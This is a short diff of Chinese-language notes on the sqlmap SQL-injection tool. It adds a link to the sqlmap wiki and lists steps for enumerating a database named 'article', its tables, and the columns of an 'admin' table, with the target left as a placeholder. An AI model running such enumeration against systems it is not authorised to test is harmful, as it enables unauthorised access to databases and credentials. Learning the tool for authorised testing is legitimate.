@@ -1,3 +1,7 @@
+
+
+https://github.com/sqlmapproject/sqlmap/wiki/Introduction
+
 注入工具：sqlmap:python27:
 
 1.判断库名：article
@@ -11,8 +15,6 @@ sqlmap.py -u "注入点" -D article --tables
 3.判断列名
 
 sqlmap.py -u "注入点" -D article -T admin --columns
-
-
 
 4.判断值：
 
